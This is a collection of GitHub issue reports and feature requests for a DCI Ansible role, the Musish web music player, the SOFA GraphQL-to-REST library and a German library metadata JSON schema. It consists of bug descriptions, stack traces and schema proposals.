TASK [dci-sync-registry : Create the http-proxy configuration for systemd] *****************************************************************************************************************************************************************************************************
task path: /usr/share/dci/roles/dci-sync-registry/tasks/main.yml:35
ERROR! The requested handler 'docker restart' was not found in either the main handlers list nor in the listening handlers list
```

Because the handlers directory is not present in the rpm package :

```console
# rpm -qa ansible-role-dci-sync-registry
ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd-1.el7.noarch

# rpm -ql ansible-role-dci-sync-registry
/usr/share/dci/roles/dci-sync-registry
/usr/share/dci/roles/dci-sync-registry/defaults
/usr/share/dci/roles/dci-sync-registry/defaults/main.yml
/usr/share/dci/roles/dci-sync-registry/files
/usr/share/dci/roles/dci-sync-registry/files/fetch_images.py
/usr/share/dci/roles/dci-sync-registry/tasks
/usr/share/dci/roles/dci-sync-registry/tasks/main.yml
/usr/share/dci/roles/dci-sync-registry/templates
/usr/share/dci/roles/dci-sync-registry/templates/docker_distribution.yml.j2
/usr/share/dci/roles/dci-sync-registry/templates/docker_http_proxy.j2
/usr/share/doc/ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd
/usr/share/doc/ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd/README.md
/usr/share/licenses/ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd
/usr/share/licenses/ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd/LICENSE
``` Using this role with the openstack agent fails with this error:

```console
TASK [dci-sync-registry : Create the http-proxy configuration for systemd] *****************************************************************************************************************************************************************************************************
task path: /usr/share/dci/roles/dci-sync-registry/tasks/main.yml:35
ERROR! The requested handler 'docker restart' was not found in either the main handlers list nor in the listening handlers list
```

Because the handlers directory is not present in the rpm package :

```console
# rpm -qa ansible-role-dci-sync-registry
ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd-1.el7.noarch

# rpm -ql ansible-role-dci-sync-registry
/usr/share/dci/roles/dci-sync-registry
/usr/share/dci/roles/dci-sync-registry/defaults
/usr/share/dci/roles/dci-sync-registry/defaults/main.yml
/usr/share/dci/roles/dci-sync-registry/files
/usr/share/dci/roles/dci-sync-registry/files/fetch_images.py
/usr/share/dci/roles/dci-sync-registry/tasks
/usr/share/dci/roles/dci-sync-registry/tasks/main.yml
/usr/share/dci/roles/dci-sync-registry/templates
/usr/share/dci/roles/dci-sync-registry/templates/docker_distribution.yml.j2
/usr/share/dci/roles/dci-sync-registry/templates/docker_http_proxy.j2
/usr/share/doc/ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd
/usr/share/doc/ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd/README.md
/usr/share/licenses/ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd
/usr/share/licenses/ansible-role-dci-sync-registry-0.0.201902061545gita824d9dd/LICENSE
```
<---------->
159973040
I would like to if the website could be bundled into a desktop app using electron? 
 Firefox 68.0.1 / Windows 10

Despite the "high quality 256kbps" radio button option being shown as selected when the settings icon is clicked, I am only getting lower quality audio. This is apparent both from listening and from using the browser's developer console to monitor network traffic - the amount of data being transferred after selecting a song matches up with 64kbps and is not nearly enough to be a 256kbps audio stream. For example, playing a nearly 4 minute long song transferred 2.89MB of data, with almost a MB of which is jpeg and script resources for the page, and a little under 2MB making up the actual mp4 chunks. 

The Widevine DRM module is set to always activated in Firefox. Session storage shows that the play.itunes.apple.com.WebObjects.MZPlay.woa.wa.widevineCert key is populated with an array length of 5, so it does appear to be loading in a certificate. I have attempted clearing the browser cache, disabling all extensions, toggling the quality option in Musish back and forth, etc. so far to no avail.

Steps to reproduce on my machine is to simply play any song, as this is affecting the entire client rather than any particular tracks or albums. im requesting a favicon for safari  When you open the page of an artist (Ludovico Einaudi: https://musi.sh/artist/7420827), first it loads some info and in 1 second it becomes blank. When you open the console, you see the error:
```
app.ab3c6a89.js:80 TypeError: Cannot read property 'name' of undefined
    at t.value (app.ab3c6a89.js:56)
    at li (app.ab3c6a89.js:80)
    at ui (app.ab3c6a89.js:80)
    at di (app.ab3c6a89.js:80)
    at Vi (app.ab3c6a89.js:80)
    at Xi (app.ab3c6a89.js:80)
    at ja (app.ab3c6a89.js:80)
    at Ra (app.ab3c6a89.js:80)
    at Oa (app.ab3c6a89.js:80)
    at $i (app.ab3c6a89.js:80)
```

Also, the Network tab displays 404 error:
Request URL: https://musi.sh/artist/7420827
Request Method: GET
Status Code: 404 

**To Reproduce**
Steps to reproduce the behavior:
1. Go to https://musi.sh/artist/7420827
2. You get a white page

**Desktop (please complete the following information):**
 - OS: Ubuntu
 - Browser: Chrome 72 & Firefox 65 Some songs just do not play when clicked on. Inspecting the console tab reveals this:
```
Access to fetch at 'https://aod-ssl.itunes.apple.com/itunes-assets/Music128/v4/79/14/48/79144841-7cd7-3c51-86a6-c3212d0bc536/mzaf_A1441084387.rmhq.aac.wa.mp4' from origin 'https://musi.sh' has been blocked by CORS policy: Request header field range is not allowed by Access-Control-Allow-Headers in preflight response.
```
![image](https://user-images.githubusercontent.com/1799378/52520908-94be4400-2c6f-11e9-9e79-b2308dce47be.png)

Here's the relevant code pretty-printed:
![image](https://user-images.githubusercontent.com/1799378/52520939-e36bde00-2c6f-11e9-905f-fa730ab76e4c.png)

Happens on Chrome 71.0.3578.98 (Windows 10 x64). **Is your feature request related to a problem? Please describe.**
It would be very nice if this could be wrapped in something like electron js so it could be used as a standalone desktop application. 

**Describe the solution you'd like**
Use electron js to build a desktop variant of this application. 
 Folders do not appear to be supported - from the sidebar under the 'Playlists' box the folder name is shown (eg, '2008') but clicking on it shows nothing.

If you go to 'Playlists' under 'My Library', all playlists show up (including those within folders) as well as the folder itself (as a blank playlist).

Not sure if this is an Apple Music API limitation or not. **Is your feature request related to a problem? Please describe.**
I am not able to continuously play the newest music I've added to my library in reverse chronological order.

**Describe the solution you'd like**
Showing the 'Recently Added' page under 'My Library' as a playlist instead of tiles of album art or allowing the music to continue playing through each album.

**Describe alternatives you've considered**
Creating a Smart Playlist (but I believe there is a limitation in the Apple Music API regarding Smart Playlists)

**Additional context**
Add any other context or screenshots about the feature request here.
 **Describe the bug**
After I open the "For You" page and the content loads, on top of the page, there is still a loading placeholder that stays there forever.

**To Reproduce**
Steps to reproduce the behavior:
1. Go to 'For You'
2. Wait for content to load

**Expected behavior**
Once the content is loaded, the placeholder should disappear.

**Screenshots**
![image](https://user-images.githubusercontent.com/4366950/51597919-b6dc6600-1efc-11e9-97d1-9d70be183db7.png)



**Desktop (please complete the following information):**
 - OS: Windows 10
 - Browser Chrome
 - Version 71

I took a look around, I hope this is not duplicate.
 Hello! Thnx for your amazing app!
I think need to add PLUS icon for song and full album Since it's probably going to be a while until Radio is implemented in MusicKitJS, I propose changing "ASAP" to Soon™️ and adding a link people can click on to request the feature from Apple. **Describe the bug**
When not logged in, you are still able to click on the musish logo which redirects you to an empty for you page.

**To Reproduce**
Steps to reproduce the behavior:
1. Be not logged in
2. Click on the musish logo
3. See 'For you' page as empty
4. Profit

**Expected behavior**
Should redirect to login page (maybe we should set this up as an actual page '/login' rather than just being accessible through state) **Describe the bug**
Looks like Musish is unable to play any custom upload songs in *iCloud Music Library* at all. Query in MusicKit API is all correct, it's able to obtain URLs but cannot play due to CORS policy.

**To Reproduce**
1. Upload your custom songs into iCloud Music Library
2. Play some songs and see CORS warning in DevTools.

**Expected behavior**
It should play songs like other official song on Apple Music

**Screenshots**
![Screenshot](https://storage.rayriffy.com/files/image/zoTuyGKCIqULmTgNsD.png)

**Desktop (please complete the following information):**
 - OS: Windows 10 1809
 - Browser: Chrome
 - Version: 72.0.3626.121

**Smartphone (please complete the following information):**
 - Device: iPhone 8
 - OS: iOS 12.1.4 (16D57)
 - Browser: Safari
 - Version: -

**Additional context**
I highly belive that this is MusicKit fault.
 **Is your feature request related to a problem? Please describe.**
A clear and concise description of what the problem is. Ex. I'm always frustrated when [...]

**Describe the solution you'd like**
A clear and concise description of what you want to happen.

**Describe alternatives you've considered**
A clear and concise description of any alternative solutions or features you've considered.

**Additional context**
Add any other context or screenshots about the feature request here.

<!-- Love Musish? Please consider supporting our collective:
 👉  https://opencollective.com/Musish -->
 **Describe the bug**
I can see the option "add to library" but it's not working for me. I get the message "Added to your playlist. It'll show up in a few seconds. Hold Tight!" but after minutes the song doesn't appear on the playlist.
I've tested the option to drag n drop too, it's not working for me.

**Desktop 
 - Browser chrome 71.0.3578.98 64 bits


 ![Drag and drop](https://user-images.githubusercontent.com/1258230/64375913-dc296a80-cfdb-11e9-818c-13ad92fa6ebf.png)
 **Is your feature request related to a problem? Please describe.**
A clear and concise description of what the problem is. Ex. I'm always frustrated when [...]

**Describe the solution you'd like**
A clear and concise description of what you want to happen.

**Describe alternatives you've considered**
A clear and concise description of any alternative solutions or features you've considered.

**Additional context**
Add any other context or screenshots about the feature request here.

<!-- Love Musish? Please consider supporting our collective:
 👉  https://opencollective.com/Musish -->
 Anyone else agree? I'm more than happy to put in a pull to add this.

I was honestly about to start coding a web app for musickit because I use linux on every device I own but I have a free apple music account because of work, so I canceled Spotify and realized I actually have no way to play apple music songs without spinning up a VM of windows to install itunes. Every other implementation was just so-so or missing major features, glad I found this.

Long story short, I'll try and help out on some issues because you saved me a ton of time, plus I have the email of the guy who wrote most of musickit library so we can annoy him directly if needed! Just kidding... but it may help if you ever get sandboxed or rate limited because of traffic, I heard that happened to a few people who had something similar.
 **Describe the bug**
When you select a song from an album that hasn't been played the song's duration in the player will flash to NaN before the actual time is shown.

**To Reproduce**
Steps to reproduce the behavior:
1. Open an album and play a certain song
2. Check the duration in the player 

**Expected behavior**
Should most likely show 00:00 before the actual time is shown

**Desktop:**
 - OS: Ubuntu 18.04
 - Browser: Firefox
 - Version 66.0.3 (64-bit)

**Possible solution**
We can tweak the _getTime_ function in **Utils.js** to check for NaN value passed and set the ms to 0 if that is the case
e.g.

```
export function getTime(ms) {
  if (isNaN(ms)) ms = 0;
  const s = 1000 * Math.round(ms / 1000);
  const d = new Date(s);

  return `${d.getUTCMinutes()}:${String(`0${d.getUTCSeconds()}`).slice(-2)}`;
}
``` Currently there is a moment of silence during track changes in albums while the next song is being fetched, which for tracks that are intended to run seamlessly into each other is disruptive when listening.

Presumably the pause is due to the next song being fetched via the API, would it be possible to prefetch the song and have it play seamlessly?
<---------->
160542305
When an object is used in the request query, it's fields are not parsed into the correct GraphQL scalar type. This needs to be done recursively. https://github.com/Urigo/SOFA/blob/master/src/parse.ts#L20

This needs to change to &&, as it's not catching undefined/null fields that are then attemped to parse throwing an error. Can Sofa-api be used out of the box with Apollo federation? I would like to try this out, without using schema stitching (which is deprecated) and would love to know the thoughts of the library authors. I got this error when i try to implement sofa:

(GrapdhQL has a upload function)

Error: Unknown type "Upload". Did you mean "Float"?
    at assertValidSDL (/node_modules/graphql/validation/validate.js:80:11)
    at Object.buildASTSchema (/node_modules/graphql/utilities/buildASTSchema.js:69:34)
    at Object.buildSchemaFromTypeDefinitions (/node_modules/graphql-tools/dist/generate/buildSchemaFromTypeDefinitions.js:23:28)
    at makeExecutableSchema (/node_modules/graphql-tools/dist/makeExecutableSchema.js:26:29)
    at Object.<anonymous> (/src/server.js:52:16)
    at Module._compile (internal/modules/cjs/loader.js:701:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)
    at Module.load (internal/modules/cjs/loader.js:600:32)
    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)
    at Function.Module._load (internal/modules/cjs/loader.js:531:3)
    at Function.Module.runMain (internal/modules/cjs/loader.js:754:12)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:622:3)
 Can Sofa-api be used out of the box with Apollo federation? I would like to try this out without using schema stitching (which is deprecated) and would love to know the thoughts of the library authors. Hey Urigo,

First of all, thanks for this library. the concept is really cool, but...
I've just follow the simple configuration and tried to run, got this error:

```
RangeError: Maximum call stack size exceeded
```

This is the schema I am passing. It works fine with apollo-server:
```js
import { makeExecutableSchema } from "apollo-server"
import typeDefs from "./typeDefs"
import resolvers from "./resolvers"
import {
  isAuthDirective,
  hasScopeDirective,
  isAdminDirective,
} from "./directives"

export default makeExecutableSchema({
  typeDefs,
  resolvers,
  schemaDirectives: {
    isAuth: isAuthDirective,
    hasScope: hasScopeDirective,
    isAdmin: isAdminDirective,
  }
})
```

And the full stack trace:
```bash
RangeError: Maximum call stack size exceeded
    at resolveField (/foo/node_modules/sofa-api/src/operation.ts:278:22)
    at /foo/node_modules/sofa-api/src/operation.ts:218:16
    at Array.map (<anonymous>)
    at resolveSelectionSet (/foo/node_modules/sofa-api/src/operation.ts:217:39)
    at resolveField (/foo/node_modules/sofa-api/src/operation.ts:328:21)
    at /foo/node_modules/sofa-api/src/operation.ts:218:16
    at Array.map (<anonymous>)
    at resolveSelectionSet (/foo/node_modules/sofa-api/src/operation.ts:217:39)
    at resolveField (/foo/node_modules/sofa-api/src/operation.ts:328:21)
    at /foo/node_modules/sofa-api/src/operation.ts:218:16
    at Array.map (<anonymous>)
    at resolveSelectionSet (/foo/node_modules/sofa-api/src/operation.ts:217:39)
    at resolveField (/foo/node_modules/sofa-api/src/operation.ts:328:21)
    at /foo/node_modules/sofa-api/src/operation.ts:218:16
    at Array.map (<anonymous>)
    at resolveSelectionSet (/foo/node_modules/sofa-api/src/operation.ts:217:39)
```

Let me know what else I can provide to help you. 
Thank you! hi,

i tried integrating sofa api my current set of schema.

whenever i try to hit the /api routes, it throws me this error. Is there a docs where i can find how i can query ?


Error: Field "node" of type "Node" must have a selection of subfields. Did you mean "node { ... }"?

GraphQL request (4:5)
3:     nodeId
4:     node(nodeId: $queryNodeNodeId)
       ^
5:   }

    at /Users/sandeep/Documents/projects/dev/master_registry/node_modules/sofa-api/src/express.ts:237:13
    at step (/Users/sandeep/Documents/projects/dev/master_registry/node_modules/sofa-api/dist/express.js:43:23)
    at Object.next (/Users/sandeep/Documents/projects/dev/master_registry/node_modules/sofa-api/dist/express.js:24:53)
    at fulfilled (/Users/sandeep/Documents/projects/dev/master_registry/node_modules/sofa-api/dist/express.js:15:58)
    at process._tickCallback (internal/process/next_tick.js:68:7)
 Is there any way to add authorization to the REST endpoints generated by my graphql queries? Im trying to implement sofa.

This is so far what I have:
```js
const sofa = require('sofa-api');
const express = require('express');
const app = express();
const { makeExecutableSchema } = require('graphql-tools');
const fs = require('fs');
const resolvers = require('./graphql/resolvers');
const {
  gql
} = require('apollo-server-express');
const typeDefs = gql(
  fs.readFileSync(__dirname.concat('/graphql/schema.graphql'), 'utf8')
);
const schema = makeExecutableSchema({
  typeDefs,
  resolvers: resolvers,
});
app.use(
  sofa({
    schema
  })
);
```

I get as response:
```
TypeError: sofa is not a function
    at Object.<anonymous> (/Applications/MAMP/htdocs/claro360/products360/src/sofa.js:22:3)
    at Module._compile (internal/modules/cjs/loader.js:701:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)
    at Module.load (internal/modules/cjs/loader.js:600:32)
    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)
    at Function.Module._load (internal/modules/cjs/loader.js:531:3)
    at Module.require (internal/modules/cjs/loader.js:637:17)
    at require (internal/modules/cjs/helpers.js:22:18)
    at Object.<anonymous> (/Applications/MAMP/htdocs/claro360/products360/src/server.js:65:1)
    at Module._compile (internal/modules/cjs/loader.js:701:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)
    at Module.load (internal/modules/cjs/loader.js:600:32)
    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)
    at Function.Module._load (internal/modules/cjs/loader.js:531:3)
    at Function.Module.runMain (internal/modules/cjs/loader.js:754:12)
    at startup (internal/bootstrap/node.js:283:19)
```

Any help on this?

Thanks in advance So, I believe @jnevin already messaged you before, but this is the problem we are currently facing.

We want to set up Sofa with a Postgraphile server. Postgraphile is a middleware that automatically generates a GraphQL schema from a Postgres database. So the end goal is to automatically create a GraphQL schema and query endpoint with automatically generated REST endpoints on top.

Here is a sample code below. 

`
const express = require("express");
const {postgraphile,createPostGraphileSchema, withPostGraphileContext} = require('postgraphile');
const {useSofa} = require('sofa-api');
const listRESTEndpoints = require('express-list-endpoints');
const app = express();

createPostGraphileSchema("postgres://admin:ev-udp@localhost:5432/ev_udp_db",'public', { dynamicJSON: true }).then(schema=>{
    console.log('schema', JSON.stringify(schema));
    
    app.use('/rest', useSofa({ schema }));
    app.use('/graphql',
        postgraphile(
            "postgres://admin:ev-udp@localhost:5432/ev_udp_db",
            "public",
            {
                watchPg:true,
                graphiql:true,
                enhanceGraphiql: true,
            }
        ),
    )
    console.log(listRESTEndpoints(app));
    app.listen(3005);
})
.catch(err=>console.log(err));
`
We created a schema with a Postgraphile function and we want to use that schema to power the Sofa middleware. 

The endpoints seem to generate alright, but when you actually try and make requests to those endpoints, you get this error.

`
TypeError: Int cannot represent non-integer value: undefined
    at GraphQLScalarType.serializeInt [as serialize] (/Users/kennycheng/dev/udp/ugroup-api/node_modules/graphql/type/scalars.js:43:11)
    at resolveVariable (/Users/kennycheng/dev/udp/ugroup-api/node_modules/sofa-api/dist/parse.js:24:30)
    at Object.parseVariable (/Users/kennycheng/dev/udp/ugroup-api/node_modules/sofa-api/dist/parse.js:6:16)
    at /Users/kennycheng/dev/udp/ugroup-api/node_modules/sofa-api/dist/express.js:165:35
    at Array.reduce (<anonymous>)
    at /Users/kennycheng/dev/udp/ugroup-api/node_modules/sofa-api/dist/express.js:163:47
    at Generator.next (<anonymous>)
    at /Users/kennycheng/dev/udp/ugroup-api/node_modules/sofa-api/dist/express.js:8:71
    at new Promise (<anonymous>)
    at __awaiter (/Users/kennycheng/dev/udp/ugroup-api/node_modules/sofa-api/dist/express.js:4:12)
`
Not entirely sure how the context and execute functions within Sofa. Could it possibly be a problem with those? ## Summary

We want to use function `camelCase` in resolvers Query or Mutation.
Then access it through REST by `api/camelcase`

## Motivation

Naming function would be intuitively using camelCase, but REST API are case insensitive so it should be handled when router creation

## Drawbacks

Is there will be handling for duplicate routes?

## Alternatives

N/A

## Unresolved questions

N/A Thanks for creating this library, very nice idea!

I'm trying to support both `GET` and `HEAD` for the same resource, for example `"foobar"`, mounted on `/foobar` path. The v0.4.0 release with HTTP method customization comes in handy.

I'm trying to expose the following HTTP routes:
* use `HEAD /foobar`, semantically, to check for existence/absence of a given resource, and return respectively code `200` and `404` (empty body)
* use `GET /foobar` to fully retrieve the content of that resource, returning a `200` + body in case of existence, and a `404` if missing

I use two GraphQL queries defined as `foobar()` and `foobarExists()`, respectively, in my GraphQL schema. I need to override the path mounted in express as `/foobar` instead of `/foobar-exists`.

At the moment, I simply strip the `-exists` part of the path (`@directive()` would be cleaner, rather than using a convention in the `path`/GraphQL query name). However this approach with current version of SOFA only seems to update the path in the swagger document, but does not override the path in the `express.Router` instance. By looking at SOFA's code, my understanding is that this cannot be supported at the moment unless manually updating the `express.Router` instance returned by `useSofa()`.

In short, I'm trying to expose multiple GraphQL queries on the same `/resource` path, semantically distinguishing actions via HTTP methods.
What would you recommend for such use case? Im generating swagger docs form my graphql schema but Im unsure how to add descriptions to request parameters in swagger via the graphql schema. I know how I would add the descriptions if I were adding it directly to swagger.yml but since Im auto-generating the swagger.yml using sofa/open api I need to add the descriptions into the graphql schema somehow. I tried using doc strings in the typedegs.gql file but that didn't work. Is there a way to do this?  I have a graphql query resolver that accepts nullable arguments. One of those arguments is of type int and when I make a rest call to the endpoint without that argument, it passes 0 instead of null.  Hey! I've just stumbled across this project, and I'm extremely interested. I was curious if there was any intent or pathways to support usage in [Koa](https://koajs.com/).

Of note is [koa-connect](https://github.com/vkurchatkin/koa-connect). Hey! I've just stumbled across this project, and I'm extremely interested. I was curious if there was any intent or pathways to support usage in [Koa](https://koajs.com/).

Of note is [koa-connect](https://github.com/vkurchatkin/koa-connect). Im trying to implement sofa.

This is so far what I have:

const sofa = require('sofa-api');
const express = require('express');
const app = express();
const { makeExecutableSchema } = require('graphql-tools');
const fs = require('fs');
const resolvers = require('./graphql/resolvers');
const {
  gql
} = require('apollo-server-express');
const typeDefs = gql(
  fs.readFileSync(__dirname.concat('/graphql/schema.graphql'), 'utf8')
);
const schema = makeExecutableSchema({
  typeDefs,
  resolvers: resolvers,
});
app.use(
  sofa({
    schema
  })
);


I get as response:

TypeError: sofa is not a function
    at Object.<anonymous> (/Applications/MAMP/htdocs/claro360/products360/src/sofa.js:22:3)
    at Module._compile (internal/modules/cjs/loader.js:701:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)
    at Module.load (internal/modules/cjs/loader.js:600:32)
    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)
    at Function.Module._load (internal/modules/cjs/loader.js:531:3)
    at Module.require (internal/modules/cjs/loader.js:637:17)
    at require (internal/modules/cjs/helpers.js:22:18)
    at Object.<anonymous> (/Applications/MAMP/htdocs/claro360/products360/src/server.js:65:1)
    at Module._compile (internal/modules/cjs/loader.js:701:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)
    at Module.load (internal/modules/cjs/loader.js:600:32)
    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)
    at Function.Module._load (internal/modules/cjs/loader.js:531:3)
    at Function.Module.runMain (internal/modules/cjs/loader.js:754:12)
    at startup (internal/bootstrap/node.js:283:19)


Any help on this?

Thanks in advance Hi,

I'm an interaction designer ramping up on modern web development approaches, and Sofa struck me as mind-bogglingly useful. Thanks for unleashing this upon the world! 
(Additionally - my girlfriend and I both love the project's website.)

One thing I'm struggling with, as a relative newbie, is how to use Sofa with servers that may _implicitly_ or _currently_ be based on express, but are not _intrinsically_ based on express; i.e. Apollo and GraphQL-Yoga.

I've tried to integrate Sofa with GraphGL-Yoga on my own, and tested github examples that attempt to integrate Sofa, but am so far striking out.

Do you have any recommendations, or can you point to any examples that you know to be working?

Thanks again for creating this project. I got this error when i try to implement sofa:

(GrapdhQL has a upload function)

Error: Unknown type "Upload". Did you mean "Float"?
    at assertValidSDL (/node_modules/graphql/validation/validate.js:80:11)
    at Object.buildASTSchema (/node_modules/graphql/utilities/buildASTSchema.js:69:34)
    at Object.buildSchemaFromTypeDefinitions (/node_modules/graphql-tools/dist/generate/buildSchemaFromTypeDefinitions.js:23:28)
    at makeExecutableSchema (/node_modules/graphql-tools/dist/makeExecutableSchema.js:26:29)
    at Object.<anonymous> (/src/server.js:52:16)
    at Module._compile (internal/modules/cjs/loader.js:701:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)
    at Module.load (internal/modules/cjs/loader.js:600:32)
    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)
    at Function.Module._load (internal/modules/cjs/loader.js:531:3)
    at Function.Module.runMain (internal/modules/cjs/loader.js:754:12)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:622:3)
 Using sofa-api@0.5.1 and still unable to add descriptions in swagger docs. I have typedefs.gql file and I'm trying to add descriptions to the fields and arguments using docstrings as documented here: https://www.apollographql.com/docs/graphql-tools/generate-schema/#descriptions--deprecations 
But the descriptions are not showing up. 
<---------->
160713580
Das Objekt-Array "subject_terms" besteht bislang aus den drei Eigenschaften "lang_code" (string), "scheme" (string) und "terms" (array). Drei Propertys scheinen auszureichen, aber die Reduzierung des "scheme" auf einen String halten wir für zu schmal. Wir bräuchten neben der Textversion des Sacherschließungssystems unseres Erachtens noch eine URI oder URL als (zumindest fakultative) Angabe. Mit "scheme" = "GND" könnte bei der VZG sicher jeder etwas anfangen, mit "scheme" = "DDC" könnte man aber sofort die Gegenfrage stellen, ob man sich dabei auf Ausgabe 22 oder Ausgabe 23 bezieht. Dies ließe sich mit einer URL/URI unterscheiden.  Das journal-Object enthält das Property end_page, welches nach unserer Erfahrung nicht immer vom Verlag / dem Datenlieferanten mitgeliefert wird. Es wäre daher gut, wenn es den Status optional erhielte.

Wie bereits angemerkt wurde, kann es gelegentlich vorkommen, dass Seitenangaben in den Metadaten fehlen, es sollte daher nicht verpflichtend sein. Außerdem noch die Frage wie z.B. mit römischen oder alphanumerischen Zählungen umgegangen werden soll. Es gibt im Schema an dieser Stelle kein einschränkendes Pattern, solche Seitenangaben können also direkt übertragen werden? Bei Artikeln sind auch Untertitel, Zählungen (bei mehrteilig erscheinenden Aufsätzen) und übersetzte Titel (bei Aufsätzen, die in mehreren Sprachen erscheinen) möglich. Damit könnte title zum Object werden (mit Properties maintitle, subtitle und alttitle[]) oder man bräuchte weitere Felder auf oberster Hierarchieebene.

Falls die Ausgangsdaten eine Unterteilung in Haupttitel und Untertitel besitzen, sollte es möglich sein, das im Lieferformat zu übernehmen. Dafür wäre es wie Herr Keßler vorschlagen hat, wohl nötig das Element title zum Objekt zu machen und weitere properties wie subtitle bereitzustellen. Zählungen oder Paralleltitel sind bei unserem Metadatenmaterial der Verlage bisher eher nicht der Fall, es spräche aus unserer Sicht aber auch nichts dagegen dafür properties anzulegen. "Dieses Objekt muss mit einem JSON-Schema spezifiziert sein und es sollte ein Mapping des Objekts auf Picaplus-Felder mitgeliefert werden."

Es könnte von Vorteil sein, dass eine Vorlage für das Objekt und das Schema als eine separate Datei im Projekt zur Verfügung gestellt wird. So wäre es ggf. einfacher sowohl, projektspezifische Bedürfnisse, als auch ein etwas standardisiertere Abgabe dieses Objektes zu ermöglichen. Im Prinzip müsste das Schema, und ich übersehe sicher etwas, ein Array aus Objekten definieren, welches 3 Strings enthält: Inhalt, Picaplus-Feld, Picaplus-Subfeld. Oder würde es Sinn machen, dies gleich unter additional_data zu definieren und sollte, diese oder eine ähnliche Definition nicht ausreichen, könnte auf Projektbasis eine andere Vereinbarung getroffen werden? Artikel können (in identischer Fassung / veröffentlichtes Verlags-PDF) an mehreren Stellen gehostet werden (Verlag, Aggregator, institutionelles / fachliches Repositorium, Produktivsystem / LZA / Backup). Würde es in diesem Zusammenhang nicht Sinn machen, dass das Schema den Zugang über mehrere fulltext_urls unterstützt? Wenn ja, dann wäre auch pro URL ein Copyright-Hinweis nötig. Somit könnte es Sinn machen, ein Object-Array resource (oder anders benannt) auf oberster Hierarchieebene zu definieren, dass als Unterelemente fulltext_url und copyright enthält. Vielleicht sollte es noch möglich sein, Lizenzsigel mitzugeben falls die Artikel Bestandteil eines Paketes mit ZDB-Sigel sind?
 Es gibt Artikel, die in ihrer ersten Fassung zweisprachig erscheinen und bei denen die zwei Sprachen nicht trennbar sind (bspw. zweispaltig mit unterschiedlichen Sprachen auf einer Seite). Für diese wäre es gut, wenn lang_code ein String-Array wäre. An dieser Stelle könnte ein Verweis auf erlaubtes Vokabular stehen bzw. auch Vorgaben zum Umgang mit z.B. author keywords
 Bei Artikeln sind auch Untertitel, Zählungen (bei mehrteilig erscheinenden Aufsätzen) und übersetzte Titel (bei Aufsätzen, die in mehreren Sprachen erscheinen) möglich. Damit könnte title zum Object werden (mit Properties maintitle, subtitle und alttitle[]) oder man bräuchte weitere Felder auf oberster Hierarchieebene.

Falls die Ausgangsdaten eine Unterteilung in Haupttitel und Untertitel besitzen, sollte es möglich sein, das im Lieferformat zu übernehmen. Dafür wäre es wie Herr Keßler vorschlagen hat, wohl nötig das Element title zum Objekt zu machen und weitere properties wie subtitle bereitzustellen. Zählungen oder Paralleltitel sind bei unserem Metadatenmaterial der Verlage bisher eher nicht der Fall, es spräche aus unserer Sicht aber auch nichts dagegen dafür properties anzulegen. Könntet ihr bitte kurz erläutern, welche Zielgruppe das "JSON-Format zur Lieferung von bibliographischen Metadaten zu Zeitschriftenartikeln an die Verbundzentrale des GBV (VZG)" anspricht? In #8 wurde erwähnt, dass jeder mit Kenntnissen von Pica+ gleich Pica+ Format liefern soll. Geht es darum, dass Inhaltsanbieter die Metadaten im articleformat direkt an euch abliefern? Wir dachten bisher, dass folgender Workflow sinnvoll wäre: Inhaltsanbieter liefert Daten an Bibliothek, z.B. wegen Abschluss eines konsortialen Lizenzvertrags, Bibliothek konvertiert Verlagsdaten in das articleformat und stellt es der VZG zum schnellen Import bereit. Die Daten müssen aber auch ins CBS 1.1 gespielt werden, damit sie dort nachbearbeitet (z.B. normiert) werden können. Das journal-Object enthält das Property end_page, welches nach unserer Erfahrung nicht immer vom Verlag / dem Datenlieferanten mitgeliefert wird. Es wäre daher gut, wenn es den Status optional erhielte.

Wie bereits angemerkt wurde, kann es gelegentlich vorkommen, dass Seitenangaben in den Metadaten fehlen, es sollte daher nicht verpflichtend sein. Außerdem noch die Frage wie z.B. mit römischen oder alphanumerischen Zählungen umgegangen werden soll. Es gibt im Schema an dieser Stelle kein einschränkendes Pattern, solche Seitenangaben können also direkt übertragen werden? Neben der primary_id scheint es uns nötig anzugeben, wo das Quellsystem liegt, das den Schlüssel enthält. Dafür könnte primary_id zum Object werden und neben der Property id auch ein Property source oder uri oder type (wie bei other_ids) enthalten. würden wir bei den journal_ids ansiedeln Artikel können (in identischer Fassung / veröffentlichtes Verlags-PDF) an mehreren Stellen gehostet werden (Verlag, Aggregator, institutionelles / fachliches Repositorium, Produktivsystem / LZA / Backup). Würde es in diesem Zusammenhang nicht Sinn machen, dass das Schema den Zugang über mehrere fulltext_urls unterstützt? Wenn ja, dann wäre auch pro URL ein Copyright-Hinweis nötig. Somit könnte es Sinn machen, ein Object-Array resource (oder anders benannt) auf oberster Hierarchieebene zu definieren, dass als Unterelemente fulltext_url und copyright enthält. Es gibt Artikel, die in ihrer ersten Fassung zweisprachig erscheinen und bei denen die zwei Sprachen nicht trennbar sind (bspw. zweispaltig mit unterschiedlichen Sprachen auf einer Seite). Für diese wäre es gut, wenn lang_code ein String-Array wäre. Neben der primary_id scheint es uns nötig anzugeben, wo das Quellsystem liegt, das den Schlüssel enthält. Dafür könnte primary_id zum Object werden und neben der Property id auch ein Property source oder uri oder type (wie bei other_ids) enthalten. würden wir bei den journal_ids ansiedeln An dieser 